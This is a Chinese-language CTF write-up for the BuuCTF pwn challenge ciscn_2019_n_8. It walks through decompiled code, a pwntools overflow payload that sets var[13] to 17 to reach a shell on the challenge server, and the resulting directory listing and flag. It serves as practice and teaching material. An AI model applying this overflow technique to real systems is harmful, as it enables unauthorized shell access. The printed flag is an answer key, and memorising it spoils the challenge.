---
tags:
  - BuuCTF
  - 新手
---

# ciscn_2019_n_8

## 前置工作

直接用最简单的脚本先进入靶机，随便输入点东西（这种脚本相当于在 `nc` 了）

```python
from pwn import *
r = remote("node4.buuoj.cn", 29477)
r.interactive()
```

输出如下

```
What's your name?
ls
ls, Welcome!
Try do something~
```

看得出来这道题不太好混，那就下载附件

用 `checksec` 检查下程序位数，发现是 32 位，用 IDA（IDA 32）打开附件，直接找到 `main` 函数，按 F5 反汇编，得到如下伪代码

目标很明确，结合伪代码中我自己写的注释可知如何提权（即让程序走到 `system("/bin/sh")`）

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  int v4; // [esp-14h] [ebp-20h]
  int v5; // [esp-10h] [ebp-1Ch]

  var[13] = 0;
  var[14] = 0;
  init();
  puts("What's your name?");
  __isoc99_scanf("%s", var, v4, v5); // 数组 var 是从用户输入中得到的
  if ( *(_QWORD *)&var[13] )
  {
    if ( *(_QWORD *)&var[13] == 17LL ) // 如果数组的第 13 位等于十六进制的 17
      system("/bin/sh"); // 提权，后面就能执行 ls，cat 等命令
    else
      printf(
        "something wrong! val is %d",
        var[0],
        var[1],
        var[2],
        var[3],
        var[4],
        var[5],
        var[6],
        var[7],
        var[8],
        var[9],
        var[10],
        var[11],
        var[12],
        var[13],
        var[14]);
  }
  else
  {
    printf("%s, Welcome!\n", var);
    puts("Try do something~");
  }
  return 0;
}
```

## 填充数组

如果想要让 `var[13]` 为十六进制的 17，那么必须先将前面 `var[0]` ~ `var[12]` 全部填满，那么我们可以写出如下 Payload

```python
from pwn import *
r = remote("node4.buuoj.cn", 29477) # 远程连接
payload = b"0"*13*4 # 填充 var[0] ~ var[12]，一共 13 个位置，每个位置 4 个字节（因为是 int 类型）
payload += p32(17) # 将 var[13] 赋为在 32 位程序下的十六进制的 17
r.sendline(payload) # 发送 Payload
r.interactive() # 交互接管
```

## 攻入靶机

运行程序，此时已经提权，我们可以直接输入命令 `ls`，输出如下

```
bin
boot
dev
etc
flag
home
lib
lib32
lib64
media
mnt
opt
proc
pwn
root
run
sbin
srv
sys
tmp
usr
var
```

发现有 `flag`，于是我们输入 `cat flag` 命令，最终结果如下

```
flag{d1808d00-2a39-4d18-a09b-647ba54fb495}
```